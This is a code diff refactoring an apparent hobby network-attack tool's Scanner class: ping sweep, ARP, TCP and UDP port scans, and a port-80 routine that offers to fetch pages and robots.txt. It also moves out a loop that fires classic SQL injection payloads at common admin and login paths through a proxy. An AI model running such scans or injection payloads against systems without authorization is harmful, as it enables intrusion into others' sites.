@@ -4,10 +4,14 @@ import time
 from helper import *
 from icmplib import multiping
 from scapy.all import ARP, Ether, srp
+from network import Network
 
 # NEEDS REFACTORING
 
 class Scanner:
+    def __init__(self):
+        self.network = Network()
+        
     def pingsweep(self, address):
         addresses = []
         alive = []
@@ -45,7 +49,12 @@ class Scanner:
         else:
             print(f"Sent {len(answered) + len(unaswered)} ARP packets and found no available hosts")
             
-    def tcp_port_scan(self, host, port, proxy):
+    def tcp_port_scan(self, port, proxy, host, domain):
+        target = get_host_or_domain(host, domain)
+        if not host:
+            host = get_host(domain)
+        elif not domain:
+            domain = get_domain(host)
         open_ports = {}
         start = time.time()
         
@@ -54,7 +63,7 @@ class Scanner:
             connection = connect_tcp(host, port)
             if connection:
                 if port == "80":
-                    self.att_port_80(host, proxy)
+                    self.att_port_80(target, proxy)
                 else:
                     print(f"Connection to port {port} succeeded, port is open")
             else:
@@ -83,11 +92,16 @@ class Scanner:
 
                     for i in open_ports.items():
                         if i[0] == 80:
-                            self.att_port_80(host, proxy)
+                            self.att_port_80(target, proxy)
             else:
                 print(f"All well-known ports on the {host} subnet are closed or protected by a firewall")
                 
-    def udp_port_scan(self, host, port, proxy):
+    def udp_port_scan(self, port, proxy, host, domain):
+        target = get_host_or_domain(host, domain)
+        if not host:
+            host = get_host(domain)
+        elif not domain:
+            domain = get_domain(host)
         open_ports = {}
         start = time.time()
         
@@ -97,7 +111,7 @@ class Scanner:
             if connection:
                 print(f"Connection to port {port} succeeded, port is open")
                 if port == "80":
-                    self.att_port_80(host, proxy)
+                    self.att_port_80(target, proxy)
             else:
                 print(f"Port {port} on the {host} subnet might be closed, try a tcp scan if you think this was caused by packet loss")
         else:
@@ -124,62 +138,23 @@ class Scanner:
                             
                     for i in open_ports.items():
                         if i[0] == 80:
-                            self.att_port_80(host, proxy)
+                            self.att_port_80(target, proxy)
             else:
                 print(f"Couldn't connect to any well-known port on the {host} subnet, try a tcp scan if you think this was caused by packet loss")
                 
-    def att_port_80(self, host, proxy):
-        choice = input(f"\nPort 80 is open, do you want to fetch the contents of {get_domain(host)}, which is hosted on this ip? [y/n] ")
+    def att_port_80(self, target, proxy):            
+        choice = input(f"\nPort 80 is open, do you want to fetch the contents of {target}, which is hosted on this ip? [y/n] ")
         if choice == "y":
             if not proxy.proxy:
                 p_choice = input("\nYou have no active proxy, do you want to use one before attacking this web page? [y/n] ")
                 if p_choice == "y":
                     proxy.get_proxy()
-            get_content(host, proxy, d_ipv4=None)
+            self.network.get_content(target, proxy, d_ipv4=None)
 
-        choice_2 = input(f"\nDo you want to try and fetch the robots.txt file from {get_domain(host)}? [y/n] ")
+        choice_2 = input(f"\nDo you want to try and fetch the robots.txt file from {target}? [y/n] ")
         if choice_2 == "y":
-            try:
-                r = requests.get(f"http://{get_domain(host)}/robots.txt")
-                if "404" not in r.text:
-                    print(f"\n{r.text}")
-                else:
-                    print(f"Unable to fetch robots.txt: file not found in {get_domain(host)}")
-            except requests.exceptions.MissingSchema:
-                print(f"Unable to fetch robots.txt: file not found in {get_domain(host)}")
+            self.network.get_robots(target, proxy)
             
-        choice_3 = input(f"\nDo you want to try common sql injection payloads on {get_domain(host)}? [y/n] ")
+        choice_3 = input(f"\nDo you want to try common sql injection payloads on {target}? [y/n] ")
         if choice_3 == "y":
-            extensions = ["", ".html", ".htm", ".asp", ".aspx", ".jsp", ".php", ".jspx"]
-            directories = ["", "admin", "login", "wp-admin", "cms", "panel", "dashboard", "config", "includes"]
-            payloads = [
-                "' OR '1'='1",
-                "' OR '1'='1' --",
-                "' UNION SELECT * FROM users --",
-                "' AND 1=1 --",
-                "' OR 1=1 --",
-                "1' OR '1'='1",
-                "1' UNION SELECT * FROM users --",
-                "1' AND 1=1 --",
-                "1' OR '1'='1 --",
-                "1' OR 1=1 --"
-            ]
-
-            for d in directories:
-                for ext in extensions:
-                    url = f"{get_domain(host)}/{d}{ext}"
-                    succeeded = False
-                    for payload in payloads:
-                        try:
-                            response = requests.get(f"{url}?id={payload}", timeout=5, proxies=proxy)
-                            if "error" in response.text.lower():
-                                print(f"[!] Possible SQL injection vulnerability found on {url} with payload: {payload}")
-                                print(f"Response: {response.text[:200]}...")
-                                succeeded = True
-                            else:
-                                print(f"[+] No SQL injection detected on {url} with payload: {payload}")
-                        except requests.exceptions.RequestException as e:
-                            continue
-                        
-                    if not succeeded:
-                        print("None of the common sql injection payloads worked")
+            self.network.try_sql_injection(target, proxy)
